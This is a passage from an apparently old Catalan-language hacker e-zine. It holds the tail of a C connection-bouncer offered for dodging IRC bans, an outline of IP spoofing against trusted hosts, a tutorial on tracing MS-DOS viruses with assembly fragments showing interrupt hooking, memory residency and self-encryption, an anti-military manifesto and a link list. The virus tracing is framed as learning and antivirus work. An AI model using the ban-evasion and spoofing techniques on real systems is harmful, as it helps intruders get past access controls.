	    close(rem_fd); 
	    exit(0); 
	    break; 
	default: 
	    close(rem_fd);                  /* parent process */ 
	    if (fork()) exit(0);            /* let init worry about children */ 
	    break; 
	case -1: 
	    fprintf(stderr, "\n\rfork: %s\n\r", sys_errlist[errno]); 
	    break; 
	} 
    } 
} 

void telcli(source) 
int source; 
{ 
    int dest; 
    int found; 
    struct sockaddr_in sa; 
    struct hostent *hp; 
    struct servent *sp; 
    char gethost[100]; 
    char getport[100]; 
    char string[100]; 

	hp = gethostbyname(IRCSERV); 
	if (hp) { 
	    found++; 
#if !defined(h_addr)        /* In 4.3, this is a #define */ 
#if defined(hpux) || defined(NeXT) || defined(ultrix) || defined(POSIX) 
	    memcpy((caddr_t)&sa.sin_addr, hp->h_addr_list[0], hp->h_length); 
#else 
	    bcopy(hp->h_addr_list[0], &sa.sin_addr, hp->h_length); 
#endif 
#else /* defined(h_addr) */ 
#if defined(hpux) || defined(NeXT) || defined(ultrix) || defined(POSIX) 
	    memcpy((caddr_t)&sa.sin_addr, hp->h_addr, hp->h_length); 
#else 
	    bcopy(hp->h_addr, &sa.sin_addr, hp->h_length); 
#endif 
#endif /* defined(h_addr) */ 
	} else { 
	    if (inet_addr(gethost) == -1) { 
		found = 0; 
		sprintf(string, "Didnt find address for %s\r\n", gethost); 
		write(source, string, strlen(string)); 
	    } else { 
		found++; 
		sa.sin_addr.s_addr = inet_addr(gethost); 
	    } 
	} 
    sa.sin_family = AF_INET; 
    sa.sin_port = htons((unsigned) IRCPORT); 
    if (sa.sin_port == 0) { 
	sp = getservbyname(getport, "tcp"); 
	if (sp) 
	    sa.sin_port = sp->s_port; 
	else { 
	    sprintf(string, "%s: bad port number\r\n", getport); 
	    write(source, string, strlen(string)); 
	    return; 
	} 
    } 
    if ((dest = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
	perror("telcli: socket"); 
	exit(1); 
    } 
    connect(dest, (struct sockaddr *) &sa, sizeof(sa)); 
#ifdef FNDELAY 
    fcntl(source,F_SETFL,fcntl(source,F_GETFL,0)|FNDELAY); 
    fcntl(dest,F_SETFL,fcntl(dest,F_GETFL,0)|FNDELAY); 
#else 
    fcntl(source,F_SETFL,O_NDELAY); 
    fcntl(dest,F_SETFL,O_NDELAY); 
#endif 
    communicate(dest,source); 
    close(dest); 
    exit(0); 
} 

communicate(sfd,cfd)    { 
    char *chead, *ctail, *shead, *stail; 
    int num, nfd, spos, cpos; 
    extern int errno; 
    fd_set rd, wr; 

    chead = ctail = cbuf; 
    cpos = 0; 
    shead = stail = sbuf; 
    spos = 0; 
    while (1) { 
	FD_ZERO(&rd); 
	FD_ZERO(&wr); 
	if (spos < sizeof(sbuf)-1) FD_SET(sfd, &rd); 
	if (ctail > chead) FD_SET(sfd, &wr); 
	if (cpos < sizeof(cbuf)-1) FD_SET(cfd, &rd); 
	if (stail > shead) FD_SET(cfd, &wr); 
	nfd = select(256, &rd, &wr, 0, 0); 
	if (nfd <= 0) continue; 
	if (FD_ISSET(sfd, &rd)) { 
	    num=read(sfd,stail,sizeof(sbuf)-spos); 
	    if ((num==-1) && (errno != EWOULDBLOCK)) return; 
	    if (num==0) return; 
	    if (num>0) { 
		spos += num; 
		stail += num; 
		if (!--nfd) continue; 
	    } 
	} 
	if (FD_ISSET(cfd, &rd)) { 
	    num=read(cfd,ctail,sizeof(cbuf)-cpos); 
	    if ((num==-1) && (errno != EWOULDBLOCK)) return; 
	    if (num==0) return; 
	    if (num>0) { 
		cpos += num; 
		ctail += num; 
		if (!--nfd) continue; 
	    } 
	} 
	if (FD_ISSET(sfd, &wr)) { 
	    num=write(sfd,chead,ctail-chead); 
	    if ((num==-1) && (errno != EWOULDBLOCK)) return; 
	    if (num>0) { 
		chead += num; 
		if (chead == ctail) { 
		    chead = ctail = cbuf; 
		    cpos = 0; 
		} 
		if (!--nfd) continue; 
	    } 
	} 
	if (FD_ISSET(cfd, &wr)) { 
	    num=write(cfd,shead,stail-shead); 
	    if ((num==-1) && (errno != EWOULDBLOCK)) return; 
	    if (num>0) { 
		shead += num; 
		if (shead == stail) { 
		    shead = stail = sbuf; 
		    spos = 0; 
		} 
		if (!--nfd) continue; 
	    } 
	} 
    } 
} 
-------------------------------------------------------------------------------------------------

Per la gent ke fagi servir win i no tinguin una makina unix, hi ha molt de
scripts ke porten algun text per saltar-se una k-line. Hi ha altres programes
d'akest tipus, com per exemple el winbouncer;
es molt facil de configurar i el podeu fer servir per kualsevol kosa, nomes
teniu ke indicar el host u els ports.


4- IP-Spoofing

El IP-Spoofing es una tecnika bastant dificil i complexa que rekereix alguns
coneixements del protocol TCP-IP.
En fi, el IP-Spoofing consisteix en enganyar a una makina "host 1" fenli
kreure ke som una altre makina "host 2" que en realitat no som.


		       acces            
		host 2 ----> host 1
		     sense passwd

Akesta tecnica es basa a fer servir en alguns sistemes de permetre l'acces
sense una comprovacio a traves de contrasenya i utilitzant la confiança en
les direccions IP.

Els server 1 te dipositada confiança en el serve 2 (tryst host), coneix la
seva ip i no demna pass d'entrada al seu sistema. 
Per fer aixo necessitem tenir privilegis root desde la makina que es realitza
l'atac. Quan vosaltres feu algun atac modificau els pakets de dades canviant
en akests la vostre direccio Ip i fents servir la del trust host. Degut aixo
les respostes de la makina objectiu envii a akella transmisio TCP-IP no la
rebreu vosaltres sino la trust host.

El problema ve de que tenim que intuir les respostes que dependra de vosaltres
mateixos. Una vegada que ho tingueu tot fet porcedirem al atac IP-Spoofing
pero recordeu ke no rebreu respostes per part de la makina objectiu.

------------------------------------------------------------------------------
					
							     Live your dreams.

==============================================================================
//////////////////////////////////////////////////////////////////////////////
.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.Be.You.
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
==============================================================================

$0A$

// // // // // // // // // // // // // // // // // //
// .-----------------------------.---------------. //
// |  >> Traçant Virus           |  per Pop.tPH  | //
// `-----------------------------'---------------' // 
// // // // // // // // // // // // // // // // // // 



Introducció:

Pot  ser curiós traçar  un virus, buscar  les rutines que utilitza,  pixar-nos
l'antidebugging,  mirar quina marca  d'infecció utilitza,  la seva estructura,
com infecta, si s'encripta, com restableix la capçalera, etc. A part de curiós 
tb s'apren  bastant d'ensamblador i  ens pot ser bastant útil,  tant per crear
anti-virus  com virus  o simplement  programar amb ensamblador. Per cert, aqui
parlaré de virus en  16bits (per msdos),  no em ficaré  amb els de  win32, que
potser tractaré en un altre article.


Llistat de compres:

1) Un debugger (el HACKdebugger ens anirà bé (està en la cathack4))
2) Un fitxer infectat (o simplement el virus compilat)
   si no sabeu si en teniu pilleu l'antivirus i algun sortirà.
3) I una mica de galetes blaves .... mmmh fulete ;)

Un cop ho tinguem tot obrim el fitxer infectat amb el debugger:
	X:\> hack file.exe

Okis, ara  premem  Control+V  (si no ens  surt la barra  d'abaix).  Com podrem
comprovar,  si aquest virus segueix la norma del 99.9% dels virus,  la primera
ordre és un JMP XXXX,  aixo el que fa es saltar-nos al codi del virus,  premem
F7:trace i llavors, si tot va bé i el virus segueix seguint la norma del 99.9%
del virus, ens trobarem amb un CALL XXXX, pq?  doncs pq els virus (els que són
una mica  complexes i  necessiten referències  a cadenes de dades  i per tant,
aquestes  referències  tindràn  un BP (base pointer)  diferent en  cada fitxer
infectat i  per tant ens  caldrà pillar a quina  IP comença el codi del virus.

	3F8B:0100 JMP 0300
	3F8B:0103 [...]

Hi han diverses formes  de fer-ho,  la més utilitzada, és fer un POP i un SUB,
usease,  quan es fa un call,  la màquina graba en  la pila  la possició en que
està per poder retornar més tard amb un RET. Pero podem aprofitar-nos i no fer
el RET  però  treient  de la  pila aquest valor amb  un POP BP (grabem en BP),
després caldrà  fer-hi SUB BP,3 per restar-li el tamany dels 3 bytes que ocupa
la ordre CALL. (encara q no tots ho fan, depen del disseny del virus).

	3F8B:02FE [...]
	3F8B:0300 CALL 0303
	3F8B:0303 POP BP
	3F8B:0304 SUB BP, 03
	3F8B:0306 [...]

Un cop trobada la base (encara que a vegades, alguns virus, la troben més
endavant, per evitar els Heuristics dels Avirus), el virus (si és resident
mirarà si està resident, utilitzant la seva marca d'infecció). Pero alguns
virus, abans de fer aixo comproven si és un EXE o no, mirant el PSP, per
saber si haurà de modificar el CS a l'hora de restablir la capçalera. El
virus Bleah fa aixo:

	3F8B:0304 [...]
	3F8B:0306 CMP BYTE PTR CS:[BP+3B], 01
	3F8B:0309 JNE 030C      ; Salta si no és EXE
	3F8B:030A PUSH ES
	3F8B:030B PUSH DS       ; graba el ES i el DS si és un .EXE
	3F8B:030C [...]

La seva marca d'infecció acostuma a estar penjada d'alguna interrupció, no
utilitzada normalment, i alguns virus utilitzen paraules escrites en els
registres i si al executar el virus no els retorna la 'resposta' doncs
procedeixen a penjar-se a la memòria.

    [Exemple del virus AntiCaro]-----------------------------------.
								    |
	AX = 'CA' |----->  executa interrupció   |---> AX = 'SU'    |
	BX = 'RO' |       d'on es penja el virus |     BX = 'X!'    |
								    |
	------------------------------------------------------------'

	3F8B:0308 MOV AX, 4321
	3F8B:030A INT EE        ; interrupció "infectada"
	3F8B:030B CMP AX, 1234  ; si està infectada ens ha de retornar aixo.
	3F8B:030E JNE 0400      ; nop, saltem a la rutina per pujar-lo a mem.
	3F8B:0311 [...]

Un cop fet aixo (normalment, si està en memoria el que fa es restablir la
capçalera del fitxer infectat per tallar el virus i executar el programa amb
normalitat, aixo ho fan aixi:

	3F8B:030E [...]
	3F8B:0311 CLD           ; pq al fer el REP ho faci incrementant
				; si fessim STD, ho faria decrementant.
	3F8B:0312 PUSH CS
	3F8B:0313 PUSH CS
	3F8B:0314 POP  ES       ; Aixo ho fa si és un .COM
	3F8B:0315 POP  DI
	3F8B:0316 MOV CX, 0003  ; copiar 3 bytes.
	3F8B:0319 MOV DI, 0100  ; inici del fitxer
	3F8B:031C MOV SI, BP+0203 ; lloc on té grabada la capçalera
	3F8B:031F REP           ; Repeteix CX vegades la ordre següent.
	3F8B:0320 MOVSB         ; Copia byte a byte desde DS:SI a ES:DI
	3F8B:0321 [ aqui normalment netegen els registres ]
	3F8B:032E JMP 0100      ; i salten a l'inici del programa

Si el que han de fer es penjar-se a la memòria doncs llavors primer penjen la
interrupció amb les funcions 25 i 35 de la INT 21h i un cop fet aixo es pujen
a la memoria per tal de seguir funcionant.

PENJADA DE INTERRUPCIONS:
	MOV AX, 35XX    ; XX és igual al nombre d'interrupció
	INT 21
	MOV WORD PTR [0200], BX
	MOV WORD PTR [0202], ES ; llegim el vector de la INT XX
	;--------
	MOV AX; 25XX    ; XX és el nombre d'interrupció                      
	PUSH CS
	POP DS
	MOV DX, 0134    ; possició inicial de la nova interrupció
	INT 21


PUJADA A LA MEMòRIA:
	MOV AX, DS
	DEX AX
	MOV DS, AX
	CMP DS:[0], 'Z'         ; busquem memoria lliure
	JNE -nopuedorll!-
	SUB DS:[03h], virsize/16+1 ; (blocs UMB a reservar)
	SUB DS:[12h], virsize/16+1 ; reservem la memoria
	MOV AX, WORD PTR DS:[12h]
	MOV ES, AX
	PUSH CS
	POP DS          ; CS=DS
	XOR DI, DI      ; DI=0
	MOV SI, BP
	MOV CX, virsize
	REP MOSVB       ; grabem el virus en la memoria

També es pot pujar el virus en memoria d'un altre forma, amb la INT 21h i la                      
funció 31h, grabant en DX el nombre de WORDs que ocupa el virus:

	MOV AH, 31
	MOV DX, virsize/16+1
	INT 21

Alguns virus que utilitzen tècniques d'encriptació podrem comprovar com al
inici del virus desencripten el codi per executar-lo amb rutines com aquestes

	MOV CX, 0120    ; tamany del virus
	XOR DI, DI
	MOV AX, BYTE PTR [0230] ; valor d'encriptació
  0110: XOR BYTE PTR [ 0110 + DI ], AX
	INC DI
	DEC CX
	JE 0110

	més endavant a l'hora de copiar-lo a altres fitxers, hauran de
	treure un valor aleatori nou i encriptar el codi de nou en una
	altre possició de memoria (normalment al final del fitxer), i
	llavors copiant-lo de nou, amb rutines com aquesta:

	XOR AX,AX
	INT 1A
	MOV BYTE PTR [BP+0112], DL ; treure nou valor aleatori

	CLD             ; REP ascendent
	LEA SI, BP+0112 ; inici del codi a copiar
	LEA DI, BP+0230 ; final del fitxer
	MOV CX, 0110    ; longitud a copiar
	REP MOVSB       ; COPIEM

	> I llavors aqui tornaria a encriptar el codi per copiar-lo als
	fitxers per infectar.

Rutines d'infecció:
    Les podrem identificar a que  utilitzen les tipiques  funcions d'obertura,
    escriptura, lectura i tancament de fitxers (funcions 3Dh, 40h, 3Fh, 3Eh de
    la interrupció 21h.

Tecnica "cutre" d'antidebugging:
	Alguns virus...com el Epilepsy (que estic escribint ara :P) utilitzen
	una tècnica anti-debugging cutre que impedeix llegir el codi desensam-
	blat real i donant un fals, aixo ho podrem veure si en algun moment
	el codi fa una referència a una possició "irreal" o sigui:

		3F8B:0100 JMP 0104
		3F8B:0103 MOV AX, 3030
		3F8B:0106 ADD AX, 0012

	Aqui falla algo!, pero si fem F7 (trace) podrem saltar a la possició
	0104 i llegir la veritable ordre, o sigui, que si hem de traçar un
	virus com l'Epilepsy haurem d'anar en compte i revissar totes les
	referències.


virusEXE:
+++++++++

Una tècnica bastant bona per trobar el virus facilment en fitxers EXE és anar
al final del virus (normalment els virus es graben en el final del fitxer, no
sempre), i segurament ens trobarem un codi ben estructurat, o sigui, amb ordre
logic: 3 PUSHs seguits, CMPs i JMPs i algunes INTs a 21h. Típic d'un virus,
llavors anirem pujant poc a poc desde el final del virus i podrem seguir més
o menys les rutines del virus.

Pero per saber on comença el virus en un EXE haurem d'agafar el HIEW, obrir el
fitxer infectat, canviar a mode "Decode" (o sigui 2 returns) i llavors premem
F8 i F5 (jump Entry), llavors ens saltara a un JMP o un CALL, apuntem el
numero que hi ha a la dreta (per exemple 1A0CAh) i fem F5(goto) i saltem allà.
ja està, a partir d'alla tindrem el codi del virus, per poder-lo currar ;)

Fixeu-vos que no tots els virus utilitzen les mateixes rutines de copia, per
exemple poden fer:

	REP MOSVB

	REPNZ MOVSB

	REPE MOVSB

	MOV CX, 3
	1: INC AX
	   INC BX
	   MOV AX, BX
	   LOOP 1

I una cosa, no penseu que podeu restablir fitxers infectats restablint la
capçalera i punt, bé en el 99% dels casos si, pero hi han alguns virus...
(Epilepsy :) que el que fan és agafar una part del codi i encriptar-la amb
un valor aleatori, i per tant, per més que executi la capçalera, necessitarà
la part del codi del virus que desencripti la part "fotuda" del fitxer, pq
funcioni.
	  
Traçant interrupcions infectades:

Quan els virus es pujen a la memòria (TSR, o MBR), normalment infecten una
interrupció, quasi sempre la 21h, encara q també hi han que infecten la
13h, o la 10h, o la 25h, depenent del que faci el virus clar :)

Doncs bé, per poder traçar aquesta interrupció, primer de tot haurem de
tindre el virus pujat a la memòria, haurem d'estar infectats. I un cop fet
aixo, carguem el HACKdebugger (inclòs en la cathack4), sense cargar cap
programa i escribim:

        MOV AX, 35xx  ; xx equival al nombre d'interrupció: 21 per exemple.
        INT 21

Pulsem 2 vegades F3, per executar les dues ordres. Ara tindrem grabat en
ES:BX la possició de memòria a la que crida quan executa aquella interrupció.

Ara, saltem a aquella posició: premem Control+G, (Goto), i escirim la direcció
per exemple:

        06C6:2ED7       ; en el meu cas :) un 486 amb ms6.2, Bleah i Barrotes.

Doncs bé, ara podrem contemplar el que fa el virus per infectar fitxers quan
s'executin (4B), o es tanquin, etc... tot amb funcions de la interrupció
agafada.

El que han de fer, pero no crear conflictes amb el sistema es evitar danyar
els registres, i per tant, el que fan es tot a base de comparacions i salts.

        CMP AH, 4B      ; si es crida a executar un programa
    .-- JE  2EE0        ; salta a 2EE0 (aqui aniria la rutina d'infecció).
    |
    `---> ...           ; Rutina acabada amb (JMP DWORD PTR CS) i iRET

i Aixi successivament fins que al final ens trobem amb un JMP, a la antiga
possició de memòria on es troba a veritable int21h, aixi:

    .-- JMP DWORD PTR CS:[xxxx] ; Salta a la antiga int.
  .-|-> IRET                    ; Interrupt Return
  | |                           ;   Retorna a on s'ha cridat a la intXX
  | `--> ...                    ;   o sigui, al programa real.
  |      ...
  `----- IRET                   ; Interrupt Return(torna a on s'ha fet el JMP)

D'aquesta forma es consegueix disimular que el que s'executa és la veritable
interrupció, i cal recordar una cosa, quan un virus infecta una INT, ho fa
introduint totes ordres excepte una crida a INT xx, sino a JMP_DWORD_PTR_CS:[]

Ja que si fés una crida a la interrupció directa (INT xx) es crearia un bucle
infinit i acabaria amb la penjada del sistema. :(

Segurament el virus utilitzarà alguna mena de marca d'infecció, per saber si
està cargat en memòria o no, i per saber-ho utilitza la intXX amb AX= valor
de marca d'infecció, sovint acostumen a ser paraules creades en HEX: o sigui
0123456789ABCDEF - per exemple: FACE, CAFE, BABA, FEED, etc...

o sigui que sera facil de veure, normalment es buscara una "paraula" que no
faci referencia a cap funció de la interrupció (d'Ex cap adalt), com per
exemple el Bleah (vipaldina), que fa:


        MOV AH,EE
    .-- INT 21                      .- MOV AL, FE
  .-|-> CMP AL,FE                   |  JMP DWORD PTR CS:[075A]--.
  | |   JNE 0452 (infecta la INT)   |                           |
  | |                               |                           |
  | `----> CMP AH, EE               |                           |
  |        JE  023A ----------------'                ___________V___________
  |        JMP DWORD PTR CS:[075A] --------------->|| Salta  a la veritable ||
  `------- IRET                                    || Interrupció i retorna ||
             ^                                                  V
             `--------------------------------------------------'

Doncs bé, això és tot per aquest article, espero que us hagi sigut util i
pogueu passar bones estones amb el debugger. :)


Traçar virus és un entreteniment bastant guapo, d'entrada teniu milers de
codis per "navegar" per ells, després, sempre us trobareu amb casos nous,
aprendreu ensamblador, virii i el més important de tot...haureu passat un
bon rato ;)

<popNote>
Els codis escrits en aquest texte no són extrets de cap virus, així que millor
que no probeu de juntar-los per treure algo lògic, ho he anat escribint de cap
</popNote>


				  -La vida és massa curta per viure-la amb oli

/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\/^\
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
>>>>>>>>[ Que el nazi que se cruce lo vamos a ostiar! Oi! - Gazapos ]<<<<<<<<<
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./\./

$0B$

.================================.
\\       Campanya contra la      \\
 \\       desfilada militar       \\                -Acastan
  `================================'


                 No m'agraden (MANIFEST CONTRA ELS EXERCITS)

                           per Alex Castan Salinas
                              alex.castan@upc.es



No m'agraden. Ho sento, pero no m'agraden ...

No soc capac de confiar en gent quan les seves eines de treball nomes
serveixen per matar. M'agrada mes la gent que viu el dia a dia donant una mica
mes de vida al mon.

No soc capac de confiar en gent que obeeixen ordres cegament. M'agrada mes la
gent que camina amb ulls que veuen, caps que pensen i mans obertes.

No m'agraden ... Diuen que estan per protegir-nos, pero a les guerres el 90%
dels morts son civils. Com ens protegeix una guerra? Com defensa la pau un
arma? No es millor dedicar esforcos a millorar relacions amb altres paisos i
evitar guerres, enlloc d'armar exercits que generen por i tensions?

No m'agraden ... Diuen que estan per protegir-nos, pero que es el que han de
protegir? la nostre sanitat? la nostre cultura? el nostre entorn? la nostre
gent? Llavors perque els estats gasten tant en preparar la guerra i cada cop
destinen menys pressupost a la gent que diuen protegir? Per que l'estat
espanyol destina la quarta part del seu pressupost (6.500 milions diaris) a
l'exercit? Per que no defensem la sanitat millorant hospitals i contractant
mes metges/ses? Per que no defensem la cultura comprant llibres? Per que no
defensem el medi ambient eliminant els poligons de tir? Per que no defensem la
gent subvencionant mes projectes de desenvolupament i eliminant bosses de
pobresa?

No m'agraden ... Diuen que estan per protegir-nos, pero no fa gaire temps va
tornar a haver un cop d'estat. Fa poc vaig parlar amb una de les persones mes
honestes i admirables que he conegut i em va comentar que el seu nom estava
dels primers a la llista dels que havien de ser afusellats durant aquest cop
d'estat, per estar estretament vinculat a un partit politic d'esquerra. Ara
veig nitidament que al seguent cop d'estat el meu nom tambe hi sera a la seva
llista.

No m'agraden ... Diuen que estan per protegir-nos, pero qui ens protegeix
d'ells? Ha canviat tant l'esser huma que ja no es deixa guiar per l'odi, la
irracionalitat i el poder? No estariem mes segurs si els traguessim les seves
joguines de mort i destruccio?

No m'agraden ... Diuen que estan per si un pais ens envaeix. Per que venen
armes d'amagat, llavors, a aquests paisos? I si som nosaltres, amb el nostre
exercit, els que acabem envaint un altre pais?

No m'agraden ... Diuen que fan missions humanitaries. Deu meu, pero si amb el
que costa un tanc o un bombarder es pot alimentar a mitja Africa! Per que
l'Estat espanyol ven armes als deu paisos mes denunciats per violar els drets
humans i anihilar sistematicament la seva poblacio? Hi ha millor missio
humanitaria que no exportar armes?

No m'agraden ... I aquest exercit professional ... Si els ultims anys nomes
han participat 2.000 unitats en missions "humanitaries", perque ens cal un
exercit de 200.000 unitats? No sera que hi han 45.000 comandaments i
cadascun vol manar sobre almenys tres soldats? exercit professional o
parasits professionals?

No m'agraden ... I aquesta desfilada ... Pero que no tenen sentit del
ridicul. Que fan tota aquesta gent amb boina darrera d'una cabra amb
gorra, movent rigida i espasmodicament les cames i els bracos? Que no
estarien millor passant el dia al camp, plantant un arbre, llegint un
llibre, fent l'amor amb la seva parella o parlant amb els seus pares tot
allo que un dia s'havien de dir i no van poder? Que fan aquells homes
ensenyant als nens com disparar amb una metralladora? La guerra no es un
joc! Si tant els hi agraden les missions humanitaries, per que no van a
ajudar a la gent de la nostra ciutat que viu al carrer, enlloc de
passejar-se?

Ho sento. Ja ho veieu ... no m'agraden. I a vosaltres?



Alex



"Ens poden llevar moltes coses, inclus la llibertat, pero sols si ens lleven
l'esperanca ens ho lleven tot, perque en ella esta el poder per a canviar
aquesta societat i aixi apropar-la cap a la utopia"
Anonim?

"En les guerres no hi ha 'herois' ni 'heroines'. De la guerra trauen profit
nomes els militars, dictadors, elites en el poder, traficants d'armes,
delinquents de tot tipus. Tots els altres seran derrotats, entre ells dones,
xics, xiques, vells, velles ..."
Dones de Negre contra la guerra. Belgrad. Desembre 91.

"Fan la guerra per ofici, torturen per ofici, enganyen per ofici ... Es que
no son capacos de guanyar-se la vida d'una altra manera?"
Joan Fuster

pagina oficial: [ http://vilaweb.com/desfilada-no/desfilada/ ]

Degut a la desfilada militar que el nostre govern, tant de centre (to ironic)
ens refregarà per la cara el proper diumenge 28, volem demostrar la nostra
disconformitat, i us adjuntem alguns mails que ens han arribat. Feu-los còrre.


> Asunto: Alcalde, t'equivoques !
>
> El proper diumenge 28 de maig es vol celebrar el Dia de las Fuerzas Armadas
> a Barcelona i esta previst que l'exercit espanyol desfili per la Diagonal.
> Davant aquesta mostra de prepotencia per part de l'estament militar i
> l'exhibició impudica de l'armament que ha dut i esta duent el sofriment i la
> mort a milers de persones i a molts pobles en tot el mon s'esta organitzant
> una campanya en contra de la celebració del Dia de las Fuerzas Armadas a
> Barcelona.
> Per començar volem que el nostre alcalde s'assebenti que ni les
> organitzacions ciutadanes ni els ciutadans de Barcelona volem veure
> l'exercit espanyol a la nostra ciutat, que l'alcalde sapiga que els i les
> ciutadanes de Barcelona creiem fermament en la cultura de la pau i de la
> solidaritat per a a resolucio de conflictes, i que l'existencia dels
> exèrcits a l'inici del segle XXI es un perill per a tots els habitants del
> planeta.
>
> Per això envieu un e-mail a:
> alcalde@mail.bcn.es amb còpia a:
> infodefensa@mde.es,
> presidentpujol@presidencia.gencat.es,
> consellerpomes@correu.gencat.es,
> consellertriadu@presidencia.gencat.es,
> consellermacias@correu.gencat.es
>
>  Encapceleu el vostre mail amb la frase: Alcalde, t'equivoques !
>
> PERQUE CAP EXÈRCIT DEFENSA LA PAU !!
> NO VOLEM L'EXÈRCIT A BARCELONA !!
>
>  Envieu aquest mail a tota la gent que pugueu, i els mails a l'ajuntament
> tant els podeu enviar a titol individual com signats per una entitat.

Benvolgut amic, benvolguda amiga,

Hem rebut aquest missatge, que creiem que pot ser del teu interès.

POSA UN LLENÇOL BLANC AL TEU BALCÓ!

El proper 27 de maig se "celebrarà" a Barcelona (per la Diagonal!) una
desfilada militar en commemoració del dia de les forces armades, una
mostra més de la prepotència de l'estament militar (i polític), el qual
s'enorgulleix de passejar tota la seva maquinària assassina pel centre
de la nostra ciutat, clarament antimilitarista.

Per expressar el nostre rebuig a un acte com aquest, de valors
èticament, moralment i políticament molt poc justificables (només cal
sentir les patètiques excuses de certs polítics per defensar-ho), sinó
és pel mètode de la força (l'únic que aquests personatges coneixen),
PROPOSEM a tots els ciutadans de la nostra ciutat que pengin LLENÇOLS
BLANCS als balcons.

Esperem que aquesta campanya torni a demostrar (una vegada més!) que el
civisme de la ciutadania està anys llum avançat respecte la mentalitat
retrògrada de la majoria dels "nostres representants" a les
institucions.

Per aconseguir-ho és importantíssima la teva col.laboració: difon aquest

missatge a través de tots els mitjans al teu abast: oralment, internet,
ràdio, premsa, tv,...

Passa-ho!


"Masters of War" (Senyors de la Guerra), Bob Dylan

Veniu, senyors de la guerra,
els que fabriqueu armes
i els avions de la mort
Els que fabriqueu bombes
i no doneu la cara
amagats al despatx
Només vull que sabeu que
ja us he vist la màscara

No heu fet res a la vida,
tan sols destruir
Jugueu amb el meu món
com si fos un joguet més
Em feu amo d'una arma,
feu la volta i correu
Just desapareixeu
quan volen les bales

Com Judes, el vell,
mentiu i enganyeu
Una guerra mundial
ningú la pot guanyar mai
Veig en els vostres ulls
i en els vostres cervells
com hi entra l'aigua bruta
que embruta el carrer

Poseu bé els gatells
perquè els altres disparin
Aneu lluny i observeu
quan els morts van creixent
Sou als vostres palaus
mentre la sang dels joves
s'escapa dels seus cossos
i s'enfonsa en el fang

Heu dut la pitjor por
que es pugui imaginar
Heu volgut dur la por
a portar fills al món
Per amenaçar el fill
que no és nat ni té nom
No mereixeu la sang
que us corre pel cos

Què més em cal saber
per poder opinar?
Em dieu que sóc jove
i que sóc ignorant
Però una cosa sí que sé
tot i ser un inexpert:
Ni Jesús no podria
perdonar-vos mai

Deixeu-me preguntar-vos:
Tan bons són els calers,
us compren el perdó?
De veritat ho creieu?
Quan sigui el moment
sé que us n'adonareu
Tots els vostres diners
no us serviran de res

Espero que us moriu
Que així sigui aviat
Aniré darrera el bagul
en la pàl.lida tarda
Estaré vigilant
que us posin al forat
Trepitjaré la tomba
fins saber-vos ben morts!



--
Associació Catalana de Professionals
C. Casanova 46, 4t 4a
08011 Barcelona
Tel. i fax: 93.454.30.18


El dia 20 hi haurà una manifestació contra la desfilada, contra les guerres
i contra els exèrcits on tant de bó hi vagi moltísima gent. -Per cert,
després de la mani hi haurà concert ska al casal.

El 23 o 24 intentarem acampar a la Diagonal (com lo del 0,7). Aquí sí que
necessitarem ser també força gent. Sobretot en el moment d'acampar. És segur
que la policia ens treurà i pot haver detinguts.

El 27 hi hauran actes alternatius i per la pau al parc de la Ciutadella.

El 27 tothom està convidat a anar a la desfilada i intentar aturar-la; a
anar a la desfilada a dir als pares que porten els seus fills que la guerra
no és un joc, que millor portin els nens a algún parc; a anar a les parades
que montin els militars posteriorment a la desfilada per desmontar-les.
Esteu convidats a desmontar la seva farsa sense deixar-vos impressionar.

El 27 tothom està convidat a posar un llençol blanc al seu balcó, però jo ho
posaré ja. I potser no ho poso blanc. Què tal una frase com "Militars
assassins, foteu el camp d'aquí"?

També hi hauran altres actes i accions. Aquestes depenen de cada grup i, o
bé estan encara a l'aire, o bé són secretes i millor que així continuin.
Però si el que sé es cert, podem aturar la desfilada.
	-Alex



-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD--
*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(
)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*
*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(*(
-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD-DxS-SxD--


$0C$

.---------.
|   -O-   |=========================.
| ooo8ooo |   Links                  `.
|    8    |----------------------------'
| o  8  o |
|  ºº8ºº  |
`---------'

De nou estrenem una secci¢ nova en la anirem donant-vos URLs interessant on
podreu trobar informaci¢ relacionada sobre l'HPCV, moviments socials, etc...


[ www.sessionwall.com ] - En aquesta pagina podrem trobar el programa Session
       Wall, un monitor de xarxa bastant bó, en el que ens anir informant
       sobre totes les conexions que es fan desde quina maquina a quina i a
       travs de quin port la fan. Ens pot ser bastant util per millorar la
       seguretat de les xarxes intranets, ja que ens permetr saber totes les
       conexions que es realitzin entre maquies i podrem controlar a tots els
       usuaris que facin "moviments extranys" com conexions telnet o multiples
       conexions a diversos ports d'una mateixa maquina (portscan) i ipscan,
       etc. En fi, una eina fora util.


[ http://packetstorm.securify.com/magazines.html ] Aqui podreu trobar gran
       quantitat de links a revistes de temàtica hpcv.

[ http://www.nmap.org ] - Pàgina oficial del NMAP, una eina indispensable.

[ http://www.linuxgazette.com/issue53/boldyshev.html ] - Aricle de programació
       en ASM per l'entorn Linux, bastant útil i pràctic.

[ http://linuxassembly.org/ ] - Pàgina dedicada integrament a la programació
       en ASM dins de Linux, aqui ho podreu trobar tot relacionat amb aixo.
